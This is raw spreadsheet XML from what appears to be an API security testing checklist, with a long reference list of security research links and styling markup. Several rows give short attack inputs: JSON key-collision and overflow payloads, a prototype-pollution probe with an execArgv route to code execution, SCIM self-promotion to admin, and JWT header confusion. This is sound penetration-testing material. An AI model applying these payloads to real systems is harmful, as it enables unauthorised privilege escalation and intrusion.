    <t xml:space="preserve">POST {"qty":9999999999999999999999} | One parser returns 0, another overflows to negative | Lab: BishopFox/json-interop-vuln-labs lab1</t>
  </si>
  <si>
    <t xml:space="preserve">API-23-002</t>
  </si>
  <si>
    <t xml:space="preserve">JSON key-collision via character truncation</t>
  </si>
  <si>
    <t xml:space="preserve">Unicode surrogate (qty\ud800), embedded quote (qty"), or comment-based truncation produces a duplicate key handled differently by validator vs processor.</t>
  </si>
  <si>
    <t xml:space="preserve">{"role\ud800":"admin","role":"user"} | {"qty\"":1,"qty":-100}</t>
  </si>
  <si>
    <t xml:space="preserve">API-23-003</t>
  </si>
  <si>
    <t xml:space="preserve">Unicode normalization auth bypass</t>
  </si>
  <si>
    <t xml:space="preserve">NFKC/NFKD normalization collapses different Unicode strings to the same ASCII. admin (ASCII) and admin (Cyrillic а) compare unequal in code but equal post-normalization in DB.</t>
  </si>
  <si>
    <t xml:space="preserve">Register username with mixed-script lookalikes | Test login bypass via normalization differential</t>
  </si>
  <si>
    <t xml:space="preserve">unicode.org/reports/tr15 | research on Unicode auth bypass</t>
  </si>
  <si>
    <t xml:space="preserve">API-23-004</t>
  </si>
  <si>
    <t xml:space="preserve">IDN homograph attack on host validation</t>
  </si>
  <si>
    <t xml:space="preserve">Lookalike domains (раура1.com with Cyrillic, paypa1.com) bypass allowlists that string-compare hosts.</t>
  </si>
  <si>
    <t xml:space="preserve">Register: xn--pypal-4ve.com (paypál.com) | Test against SSRF allowlist, OAuth redirect_uri validation</t>
  </si>
  <si>
    <t xml:space="preserve">owasp.org - IDN homograph</t>
  </si>
  <si>
    <t xml:space="preserve">API-23-005</t>
  </si>
  <si>
    <t xml:space="preserve">SCIM endpoint abuse</t>
  </si>
  <si>
    <t xml:space="preserve">SCIM (System for Cross-domain Identity Management) endpoints provision users/groups. Misconfigured SCIM = self-promote-to-admin or create privileged accounts.</t>
  </si>
  <si>
    <t xml:space="preserve">Discover /scim/v2/Users, /scim/v2/Groups | POST with admin role | PATCH self to add to admin group</t>
  </si>
  <si>
    <t xml:space="preserve">datatracker.ietf.org/doc/html/rfc7644</t>
  </si>
  <si>
    <t xml:space="preserve">API-23-006</t>
  </si>
  <si>
    <t xml:space="preserve">OpenAPI spec poisoning</t>
  </si>
  <si>
    <t xml:space="preserve">Malicious or compromised OpenAPI spec leads tooling, gateways, and client codegen to wrong/insecure endpoint mappings.</t>
  </si>
  <si>
    <t xml:space="preserve">Audit spec provenance (signed, version-pinned) | Test if spec URL is updateable by attackers</t>
  </si>
  <si>
    <t xml:space="preserve">github.com/OAI/OpenAPI-Specification</t>
  </si>
  <si>
    <t xml:space="preserve">API-23-007</t>
  </si>
  <si>
    <t xml:space="preserve">Server-side prototype pollution to RCE</t>
  </si>
  <si>
    <t xml:space="preserve">Inject __proto__ via JSON to pollute Object.prototype in Node.js. Detect via JSON-spaces indentation oracle. Chain to RCE via execArgv gadget. Shcherbakov et al. found 8 RCEs in NPM CLI, Parse Server, Rocket.Chat.</t>
  </si>
  <si>
    <t xml:space="preserve">POST {"__proto__":{"json spaces":99}} then GET / and observe response indentation | Universal gadget: __proto__.execArgv</t>
  </si>
  <si>
    <t xml:space="preserve">portswigger.net/web-security/prototype-pollution/server-side | arxiv.org/abs/2207.11171</t>
  </si>
  <si>
    <t xml:space="preserve">API-23-008</t>
  </si>
  <si>
    <t xml:space="preserve">Timing-attack auth oracle</t>
  </si>
  <si>
    <t xml:space="preserve">Response-time differential reveals valid users, valid tokens, valid coupon codes. Constant-time comparison required.</t>
  </si>
  <si>
    <t xml:space="preserve">Time /login for valid vs invalid username (same wrong password) | &gt;50ms differential = user enum</t>
  </si>
  <si>
    <t xml:space="preserve">owasp.org/www-community/attacks/Timing_attack</t>
  </si>
  <si>
    <t xml:space="preserve">API-23-009</t>
  </si>
  <si>
    <t xml:space="preserve">JWT header injection / confusion</t>
  </si>
  <si>
    <t xml:space="preserve">Combine jku, kid, embedded jwk, x5u for forgery — header injection chains where one supersedes another.</t>
  </si>
  <si>
    <t xml:space="preserve">Mix jku + kid + alg switches | Test which header the validator actually honors</t>
  </si>
  <si>
    <t xml:space="preserve">jwtarsenal.com | portswigger.net/web-security/jwt</t>
  </si>
  <si>
    <t xml:space="preserve">API-23-010</t>
  </si>
  <si>
    <t xml:space="preserve">GraphQL persisted-query CSRF</t>
  </si>
  <si>
    <t xml:space="preserve">Persisted-query endpoints often relax content-type/origin checks. CSRF still possible if persisted query has side effects.</t>
  </si>
  <si>
    <t xml:space="preserve">Identify persisted-query endpoint | Find mutation with sensitive side effect | CSRF via simple POST</t>
  </si>
  <si>
    <t xml:space="preserve">apollographql.com - persisted queries</t>
  </si>
  <si>
    <t xml:space="preserve">Summary by Category</t>
  </si>
  <si>
    <t xml:space="preserve">Total</t>
  </si>
  <si>
    <t xml:space="preserve">In Progress</t>
  </si>
  <si>
    <t xml:space="preserve">Pass</t>
  </si>
  <si>
    <t xml:space="preserve">Fail</t>
  </si>
  <si>
    <t xml:space="preserve">% Complete</t>
  </si>
  <si>
    <t xml:space="preserve">TOTAL</t>
  </si>
  <si>
    <t xml:space="preserve">Summary by Severity</t>
  </si>
  <si>
    <t xml:space="preserve">% Failed of Tested</t>
  </si>
  <si>
    <t xml:space="preserve">References &amp; Sources</t>
  </si>
  <si>
    <t xml:space="preserve">Source</t>
  </si>
  <si>
    <t xml:space="preserve">URL</t>
  </si>
  <si>
    <t xml:space="preserve">OWASP API Security Top 10 (2023)</t>
  </si>
  <si>
    <t xml:space="preserve">https://owasp.org/www-project-api-security/</t>
  </si>
  <si>
    <t xml:space="preserve">Foundational</t>
  </si>
  <si>
    <t xml:space="preserve">OWASP gRPC Security Cheat Sheet</t>
  </si>
  <si>
    <t xml:space="preserve">https://cheatsheetseries.owasp.org/cheatsheets/gRPC_Security_Cheat_Sheet.html</t>
  </si>
  <si>
    <t xml:space="preserve">gRPC</t>
  </si>
  <si>
    <t xml:space="preserve">https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html#websockets</t>
  </si>
  <si>
    <t xml:space="preserve">WebSocket</t>
  </si>
  <si>
    <t xml:space="preserve">OWASP Web Service Security Cheat Sheet</t>
  </si>
  <si>
    <t xml:space="preserve">https://cheatsheetseries.owasp.org/cheatsheets/Web_Service_Security_Cheat_Sheet.html</t>
  </si>
  <si>
    <t xml:space="preserve">SOAP / REST</t>
  </si>
  <si>
    <t xml:space="preserve">OWASP GraphQL Cheat Sheet</t>
  </si>
  <si>
    <t xml:space="preserve">https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html</t>
  </si>
  <si>
    <t xml:space="preserve">GraphQL</t>
  </si>
  <si>
    <t xml:space="preserve">PortSwigger - HTTP Desync Attacks</t>
  </si>
  <si>
    <t xml:space="preserve">https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn</t>
  </si>
  <si>
    <t xml:space="preserve">Smuggling</t>
  </si>
  <si>
    <t xml:space="preserve">PortSwigger - HTTP/1.1 Must Die (BH USA 2025)</t>
  </si>
  <si>
    <t xml:space="preserve">https://portswigger.net/research/http1-must-die</t>
  </si>
  <si>
    <t xml:space="preserve">Desync 2025</t>
  </si>
  <si>
    <t xml:space="preserve">PortSwigger - The Single-Packet Attack</t>
  </si>
  <si>
    <t xml:space="preserve">https://portswigger.net/research/the-single-packet-attack-making-remote-race-conditions-local</t>
  </si>
  <si>
    <t xml:space="preserve">Race Conditions</t>
  </si>
  <si>
    <t xml:space="preserve">PortSwigger - Gotta Cache Em All (BH USA 2024)</t>
  </si>
  <si>
    <t xml:space="preserve">https://portswigger.net/research/gotta-cache-em-all</t>
  </si>
  <si>
    <t xml:space="preserve">Cache Deception</t>
  </si>
  <si>
    <t xml:space="preserve">PortSwigger - Browser-Powered Desync Attacks</t>
  </si>
  <si>
    <t xml:space="preserve">https://portswigger.net/research/browser-powered-desync-attacks</t>
  </si>
  <si>
    <t xml:space="preserve">PortSwigger - JWT Attacks</t>
  </si>
  <si>
    <t xml:space="preserve">https://portswigger.net/web-security/jwt</t>
  </si>
  <si>
    <t xml:space="preserve">PortSwigger - GraphQL Security</t>
  </si>
  <si>
    <t xml:space="preserve">https://portswigger.net/web-security/graphql</t>
  </si>
  <si>
    <t xml:space="preserve">PortSwigger - CSWSH</t>
  </si>
  <si>
    <t xml:space="preserve">https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking</t>
  </si>
  <si>
    <t xml:space="preserve">PortSwigger - Practical Web Cache Poisoning</t>
  </si>
  <si>
    <t xml:space="preserve">https://portswigger.net/research/practical-web-cache-poisoning</t>
  </si>
  <si>
    <t xml:space="preserve">Caching</t>
  </si>
  <si>
    <t xml:space="preserve">PortSwigger - Server-Side Prototype Pollution</t>
  </si>
  <si>
    <t xml:space="preserve">https://portswigger.net/web-security/prototype-pollution/server-side</t>
  </si>
  <si>
    <t xml:space="preserve">Niche</t>
  </si>
  <si>
    <t xml:space="preserve">PortSwigger - HTTP Request Smuggler v3.0</t>
  </si>
  <si>
    <t xml:space="preserve">https://github.com/portswigger/http-request-smuggler</t>
  </si>
  <si>
    <t xml:space="preserve">Tooling</t>
  </si>
  <si>
    <t xml:space="preserve">Bishop Fox - JSON Interoperability Vulnerabilities</t>
  </si>
  <si>
    <t xml:space="preserve">https://bishopfox.com/blog/json-interoperability-vulnerabilities</t>
  </si>
  <si>
    <t xml:space="preserve">Parser Differential</t>
  </si>
  <si>
    <t xml:space="preserve">Bishop Fox - JSON Interop Vuln Labs</t>
  </si>
  <si>
    <t xml:space="preserve">https://github.com/BishopFox/json-interop-vuln-labs</t>
  </si>
  <si>
    <t xml:space="preserve">Lab</t>
  </si>
  <si>
    <t xml:space="preserve">HackTricks - Web API Pentesting</t>
  </si>
  <si>
    <t xml:space="preserve">https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/web-api-pentesting</t>
  </si>
  <si>
    <t xml:space="preserve">General</t>
  </si>
  <si>
    <t xml:space="preserve">HackTricks - Cloud SSRF</t>
  </si>
  <si>
    <t xml:space="preserve">https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf</t>
  </si>
  <si>
    <t xml:space="preserve">SSRF</t>
  </si>
  <si>
    <t xml:space="preserve">HackTricks - OAuth to Account Takeover</t>
  </si>
  <si>
    <t xml:space="preserve">https://book.hacktricks.xyz/pentesting-web/oauth-to-account-takeover</t>
  </si>
  <si>
    <t xml:space="preserve">OAuth</t>
  </si>
  <si>
    <t xml:space="preserve">Salt Security - API Security Research</t>
  </si>
  <si>
    <t xml:space="preserve">https://salt.security/blog</t>
  </si>
  <si>
    <t xml:space="preserve">API Security</t>
  </si>
  <si>
    <t xml:space="preserve">Escape.tech - GraphQL Security</t>
  </si>
  <si>
    <t xml:space="preserve">https://escape.tech/blog/</t>
  </si>
  <si>
    <t xml:space="preserve">Escape.tech - API Security Checklist</t>
  </si>
  <si>
    <t xml:space="preserve">https://escape.tech/blog/api-security-checklist/</t>
  </si>
  <si>
    <t xml:space="preserve">Checklist</t>
  </si>
  <si>
    <t xml:space="preserve">F5 Labs - EC2 Metadata SSRF</t>
  </si>
  <si>
    <t xml:space="preserve">https://www.f5.com/labs/articles/campaign-targets-amazon-ec2-instance-metadata-via-ssrf</t>
  </si>
  <si>
    <t xml:space="preserve">IBM - XML Signature Wrapping</t>
  </si>
  <si>
    <t xml:space="preserve">https://www.ibm.com/think/topics/xml-signature-wrapping</t>
  </si>
  <si>
    <t xml:space="preserve">SAML / SOAP</t>
  </si>
  <si>
    <t xml:space="preserve">Wiz - SSRF Academy</t>
  </si>
  <si>
    <t xml:space="preserve">https://www.wiz.io/academy/application-security/server-side-request-forgery</t>
  </si>
  <si>
    <t xml:space="preserve">Wiz - API Security Checklist</t>
  </si>
  <si>
    <t xml:space="preserve">https://www.wiz.io/academy/api-security/api-security-checklist</t>
  </si>
  <si>
    <t xml:space="preserve">Praetorian - MeshCentral CSWSH (CVE-2024-26135)</t>
  </si>
  <si>
    <t xml:space="preserve">https://www.praetorian.com/blog/meshcentral-cross-site-websocket-hijacking-vulnerability/</t>
  </si>
  <si>
    <t xml:space="preserve">Black Hills Infosec - CSWSH</t>
  </si>
  <si>
    <t xml:space="preserve">https://www.blackhillsinfosec.com/cant-stop-wont-stop-hijacking-websockets/</t>
  </si>
  <si>
    <t xml:space="preserve">Apisec - GraphQL Security Testing</t>
  </si>
  <si>
    <t xml:space="preserve">https://www.apisec.ai/blog/graphql-security-testing-guide</t>
  </si>
  <si>
    <t xml:space="preserve">Apisec - Complete API Pentest Checklist</t>
  </si>
  <si>
    <t xml:space="preserve">https://www.apisec.ai/blog/complete-api-penetration-testing-checklist</t>
  </si>
  <si>
    <t xml:space="preserve">Levo - gRPC API Testing</t>
  </si>
  <si>
    <t xml:space="preserve">https://www.levo.ai/resources/blogs/grpc-api-testing</t>
  </si>
  <si>
    <t xml:space="preserve">Levo - API Security Checklist 2026</t>
  </si>
  <si>
    <t xml:space="preserve">https://www.levo.ai/resources/blogs/api-security-testing-checklist-2026</t>
  </si>
  <si>
    <t xml:space="preserve">Redfox Security - Web API Pentesting</t>
  </si>
  <si>
    <t xml:space="preserve">https://www.redfoxsec.com/blog/web-api-pentesting-a-practical-guide-to-finding-and-exploiting-api-vulnerabilities</t>
  </si>
  <si>
    <t xml:space="preserve">WeSecureApp - API Pentest Checklist</t>
  </si>
  <si>
    <t xml:space="preserve">https://wesecureapp.com/blog/the-only-api-penetration-testing-checklist-you-need/</t>
  </si>
  <si>
    <t xml:space="preserve">Pentesterlab - GraphQL Batching</t>
  </si>
  <si>
    <t xml:space="preserve">https://pentesterlab.com/glossary/graphql-batching-attack</t>
  </si>
  <si>
    <t xml:space="preserve">Wallarm - GraphQL Batching Attack</t>
  </si>
  <si>
    <t xml:space="preserve">https://lab.wallarm.com/graphql-batching-attack-2/</t>
  </si>
  <si>
    <t xml:space="preserve">Resecurity - SSRF to AWS Metadata</t>
  </si>
  <si>
    <t xml:space="preserve">https://www.resecurity.com/blog/article/ssrf-to-aws-metadata-exposure-how-attackers-steal-cloud-credentials</t>
  </si>
  <si>
    <t xml:space="preserve">Danaepp - API Security Checklist</t>
  </si>
  <si>
    <t xml:space="preserve">https://danaepp.com/an-api-security-testing-checklist-with-a-twist</t>
  </si>
  <si>
    <t xml:space="preserve">Danaepp - Weaponizing API Discovery Metadata</t>
  </si>
  <si>
    <t xml:space="preserve">https://danaepp.com/weaponizing-api-discovery-metadata</t>
  </si>
  <si>
    <t xml:space="preserve">Recon</t>
  </si>
  <si>
    <t xml:space="preserve">Github - Autoswagger (Intruder)</t>
  </si>
  <si>
    <t xml:space="preserve">https://github.com/intruder-io/autoswagger</t>
  </si>
  <si>
    <t xml:space="preserve">Github - Kiterunner (Assetnote)</t>
  </si>
  <si>
    <t xml:space="preserve">https://github.com/assetnote/kiterunner</t>
  </si>
  <si>
    <t xml:space="preserve">Github - Clairvoyance</t>
  </si>
  <si>
    <t xml:space="preserve">https://github.com/nikitastupin/clairvoyance</t>
  </si>
  <si>
    <t xml:space="preserve">Github - InQL</t>
  </si>
  <si>
    <t xml:space="preserve">https://github.com/doyensec/inql</t>
  </si>
  <si>
    <t xml:space="preserve">Github - jwt_tool</t>
  </si>
  <si>
    <t xml:space="preserve">https://github.com/ticarpi/jwt_tool</t>
  </si>
  <si>
    <t xml:space="preserve">Github - gRPC Pentest Suite</t>
  </si>
  <si>
    <t xml:space="preserve">https://github.com/nxenon/grpc-pentest-suite</t>
  </si>
  <si>
    <t xml:space="preserve">Github - awesome-api-security</t>
  </si>
  <si>
    <t xml:space="preserve">https://github.com/arainho/awesome-api-security</t>
  </si>
  <si>
    <t xml:space="preserve">Aggregated</t>
  </si>
  <si>
    <t xml:space="preserve">Github - API-Pentesting-Checklist (xaferima)</t>
  </si>
  <si>
    <t xml:space="preserve">https://github.com/xaferima/API-Pentesting-Checklist</t>
  </si>
  <si>
    <t xml:space="preserve">Github - Shieldfy API Security Checklist</t>
  </si>
  <si>
    <t xml:space="preserve">https://github.com/shieldfy/API-Security-Checklist</t>
  </si>
  <si>
    <t xml:space="preserve">Github - API-Pentesting-Resources</t>
  </si>
  <si>
    <t xml:space="preserve">https://github.com/riteshs4hu/API-Pentesting-Resources</t>
  </si>
  <si>
    <t xml:space="preserve">Resources</t>
  </si>
  <si>
    <t xml:space="preserve">Github - http-request-smuggler</t>
  </si>
  <si>
    <t xml:space="preserve">NIST NVD - CVE-2023-44487 (HTTP/2 Rapid Reset)</t>
  </si>
  <si>
    <t xml:space="preserve">https://nvd.nist.gov/vuln/detail/CVE-2023-44487</t>
  </si>
  <si>
    <t xml:space="preserve">gRPC / CVE</t>
  </si>
  <si>
    <t xml:space="preserve">Github Advisory - CVE-2025-55163 (MadeYouReset)</t>
  </si>
  <si>
    <t xml:space="preserve">https://github.com/advisories/GHSA-prj3-ccx8-p6x4</t>
  </si>
  <si>
    <t xml:space="preserve">USENIX - Silent Spring: Prototype Pollution to RCE</t>
  </si>
  <si>
    <t xml:space="preserve">https://arxiv.org/abs/2207.11171</t>
  </si>
  <si>
    <t xml:space="preserve">Veracode - OWASP API Top 10 2023</t>
  </si>
  <si>
    <t xml:space="preserve">https://www.veracode.com/blog/breaking-down-owasp-top-10-api-security-risks-2023-what-changed-2019/</t>
  </si>
  <si>
    <t xml:space="preserve">Overview</t>
  </si>
  <si>
    <t xml:space="preserve">ImageTragick</t>
  </si>
  <si>
    <t xml:space="preserve">https://imagetragick.com</t>
  </si>
  <si>
    <t xml:space="preserve">File Upload</t>
  </si>
  <si>
    <t xml:space="preserve">PortSwigger - CL.0 Lab</t>
  </si>
  <si>
    <t xml:space="preserve">https://portswigger.net/web-security/request-smuggling/browser/cl-0</t>
  </si>
  <si>
    <t xml:space="preserve">Flatt Security - Single-Packet Beyond 1500 Bytes</t>
  </si>
  <si>
    <t xml:space="preserve">https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/</t>
  </si>
  <si>
    <t xml:space="preserve">Snyk - Zip Slip</t>
  </si>
  <si>
    <t xml:space="preserve">https://snyk.io/research/zip-slip-vulnerability</t>
  </si>
  <si>
    <t xml:space="preserve">Apisec - Vaadata - API Pentest Methodology</t>
  </si>
  <si>
    <t xml:space="preserve">https://www.vaadata.com/en/blog/api-penetration-testing-objective-methodology-black-box-grey-box-and-white-box-tests/</t>
  </si>
  <si>
    <t xml:space="preserve">Methodology</t>
  </si>
  <si>
    <t xml:space="preserve">Stackhawk - gRPC Security Best Practices</t>
  </si>
  <si>
    <t xml:space="preserve">https://www.stackhawk.com/blog/best-practices-for-grpc-security/</t>
  </si>
  <si>
    <t xml:space="preserve">Clear-gate - WebSocket Smuggling</t>
  </si>
  <si>
    <t xml:space="preserve">https://clear-gate.com/blog/websocket-misconfigurations</t>
  </si>
  <si>
    <t xml:space="preserve">Akamai - CVE-2025-32094 (0.CL Desync)</t>
  </si>
  <si>
    <t xml:space="preserve">https://nvd.nist.gov/vuln/detail/CVE-2025-32094</t>
  </si>
  <si>
    <t xml:space="preserve">Smuggling / CVE</t>
  </si>
  <si>
    <t xml:space="preserve">Cloudflare - CVE-2025-4366 (Desync)</t>
  </si>
  <si>
    <t xml:space="preserve">https://nvd.nist.gov/vuln/detail/CVE-2025-4366</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</si>
</sst>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20"/>
      <color rgb="FF1F4E79"/>
      <name val="Calibri"/>
      <family val="0"/>
      <charset val="1"/>
    </font>
    <font>
      <b val="true"/>
      <sz val="12"/>
      <color rgb="FF595959"/>
      <name val="Calibri"/>
      <family val="0"/>
      <charset val="1"/>
    </font>
    <font>
      <b val="true"/>
      <sz val="10"/>
      <name val="Calibri"/>
      <family val="0"/>
      <charset val="1"/>
    </font>
    <font>
      <sz val="10"/>
      <name val="Calibri"/>
      <family val="0"/>
      <charset val="1"/>
    </font>
    <font>
      <b val="true"/>
      <sz val="11"/>
      <color rgb="FFFFFFFF"/>
      <name val="Calibri"/>
      <family val="0"/>
      <charset val="1"/>
    </font>
    <font>
      <b val="true"/>
      <sz val="11"/>
      <color rgb="FF000000"/>
      <name val="Calibri"/>
      <family val="0"/>
      <charset val="1"/>
    </font>
    <font>
      <i val="true"/>
      <sz val="10"/>
      <color rgb="FF595959"/>
      <name val="Calibri"/>
      <family val="0"/>
      <charset val="1"/>
    </font>
    <font>
      <b val="true"/>
      <sz val="10"/>
      <color rgb="FFFFFFFF"/>
      <name val="Calibri"/>
      <family val="0"/>
      <charset val="1"/>
    </font>
    <font>
      <b val="true"/>
      <sz val="10"/>
      <color rgb="FF000000"/>
      <name val="Calibri"/>
      <family val="0"/>
      <charset val="1"/>
    </font>
    <font>
      <u val="single"/>
      <sz val="10"/>
      <color rgb="FF0563C1"/>
      <name val="Calibri"/>
      <family val="0"/>
      <charset val="1"/>
    </font>
  </fonts>
  <fills count="9">
    <fill>
      <patternFill patternType="none"/>
    </fill>
    <fill>
      <patternFill patternType="gray125"/>
    </fill>
    <fill>
      <patternFill patternType="solid">
        <fgColor rgb="FFC00000"/>
        <bgColor rgb="FF800000"/>
      </patternFill>
    </fill>
    <fill>
      <patternFill patternType="solid">
        <fgColor rgb="FFED7D31"/>
        <bgColor rgb="FFFF8080"/>
      </patternFill>
    </fill>
    <fill>
      <patternFill patternType="solid">
        <fgColor rgb="FFFFC000"/>
        <bgColor rgb="FFFF9900"/>
      </patternFill>
    </fill>
    <fill>
      <patternFill patternType="solid">
        <fgColor rgb="FFA9D08E"/>
        <bgColor rgb="FFBFBFBF"/>
      </patternFill>
    </fill>
    <fill>
      <patternFill patternType="solid">
        <fgColor rgb="FFBDD7EE"/>
        <bgColor rgb="FFD9E1F2"/>
      </patternFill>
    </fill>
    <fill>
      <patternFill patternType="solid">
        <fgColor rgb="FF1F4E79"/>
        <bgColor rgb="FF003366"/>
      </patternFill>
    </fill>
    <fill>
      <patternFill patternType="solid">
        <fgColor rgb="FFD9E1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9" fillId="6"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5" fontId="6" fillId="8" borderId="1" xfId="0" applyFont="true" applyBorder="true" applyAlignment="true" applyProtection="false">
      <alignment horizontal="center" vertical="center" textRotation="0" wrapText="false" indent="0" shrinkToFit="false"/>
      <protection locked="true" hidden="false"/>
    </xf>
    <xf numFmtId="166" fontId="6" fillId="8"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C000"/>
          <bgColor rgb="FF000000"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <fill>
        <patternFill patternType="solid">
          <fgColor rgb="FF000000"/>
          <bgColor rgb="FF000000"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <fill>
        <patternFill>
          <bgColor rgb="FFC6EFCE"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <fill>
        <patternFill>
          <bgColor rgb="FFFFC7CE"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <fill>
        <patternFill>
          <bgColor rgb="FFFFEB9C"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <fill>
        <patternFill>
          <bgColor rgb="FFEDEDE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A9D08E"/>
      <rgbColor rgb="FFFF99CC"/>
      <rgbColor rgb="FFCC99FF"/>
      <rgbColor rgb="FFFFC7CE"/>
      <rgbColor rgb="FF3366FF"/>
      <rgbColor rgb="FF33CCCC"/>
      <rgbColor rgb="FF99CC00"/>
      <rgbColor rgb="FFFFC000"/>
      <rgbColor rgb="FFFF9900"/>
      <rgbColor rgb="FFED7D31"/>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owasp.org/www-project-api-security/" TargetMode="External"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://cheatsheetseries.owasp.org/cheatsheets/gRPC_Security_Cheat_Sheet.html" TargetMode="External"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html" TargetMode="External"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://cheatsheetseries.owasp.org/cheatsheets/Web_Service_Security_Cheat_Sheet.html" TargetMode="External"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html" TargetMode="External"/><Relationship Id="rId6" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn" TargetMode="External"/><Relationship Id="rId7" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://portswigger.net/research/http1-must-die" TargetMode="External"/><Relationship Id="rId8" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://portswigger.net/research/the-single-packet-attack-making-remote-race-conditions-local" TargetMode="External"/><Relationship Id="rId9" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://portswigger.net/research/gotta-cache-em-all" TargetMode="External"/><Relationship Id="rId10" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://portswigger.net/research/browser-powered-desync-attacks" TargetMode="External"/><Relationship Id="rId11" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://portswigger.net/web-security/jwt" TargetMode="External"/><Relationship Id="rId12" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://portswigger.net/web-security/graphql" TargetMode="External"/><Relationship Id="rId13" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking" TargetMode="External"/><Relationship Id="rId14" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://portswigger.net/research/practical-web-cache-poisoning" TargetMode="External"/><Relationship Id="rId15" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://portswigger.net/web-security/prototype-pollution/server-side" TargetMode="External"/><Relationship Id="rId16" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/portswigger/http-request-smuggler" TargetMode="External"/><Relationship Id="rId17" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://bishopfox.com/blog/json-interoperability-vulnerabilities" TargetMode="External"/><Relationship Id="rId18" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/BishopFox/json-interop-vuln-labs" TargetMode="External"/><Relationship Id="rId19" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/web-api-pentesting" TargetMode="External"/><Relationship Id="rId20" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf" TargetMode="External"/><Relationship Id="rId21" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://book.hacktricks.xyz/pentesting-web/oauth-to-account-takeover" TargetMode="External"/><Relationship Id="rId22" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://salt.security/blog" TargetMode="External"/><Relationship Id="rId23" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://escape.tech/blog/" TargetMode="External"/><Relationship Id="rId24" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://escape.tech/blog/api-security-checklist/" TargetMode="External"/><Relationship Id="rId25" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.f5.com/labs/articles/campaign-targets-amazon-ec2-instance-metadata-via-ssrf" TargetMode="External"/><Relationship Id="rId26" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.ibm.com/think/topics/xml-signature-wrapping" TargetMode="External"/><Relationship Id="rId27" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.wiz.io/academy/application-security/server-side-request-forgery" TargetMode="External"/><Relationship Id="rId28" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.wiz.io/academy/api-security/api-security-checklist" TargetMode="External"/><Relationship Id="rId29" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.praetorian.com/blog/meshcentral-cross-site-websocket-hijacking-vulnerability/" TargetMode="External"/><Relationship Id="rId30" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.blackhillsinfosec.com/cant-stop-wont-stop-hijacking-websockets/" TargetMode="External"/><Relationship Id="rId31" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.apisec.ai/blog/graphql-security-testing-guide" TargetMode="External"/><Relationship Id="rId32" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.apisec.ai/blog/complete-api-penetration-testing-checklist" TargetMode="External"/><Relationship Id="rId33" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.levo.ai/resources/blogs/grpc-api-testing" TargetMode="External"/><Relationship Id="rId34" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.levo.ai/resources/blogs/api-security-testing-checklist-2026" TargetMode="External"/><Relationship Id="rId35" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.redfoxsec.com/blog/web-api-pentesting-a-practical-guide-to-finding-and-exploiting-api-vulnerabilities" TargetMode="External"/><Relationship Id="rId36" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" 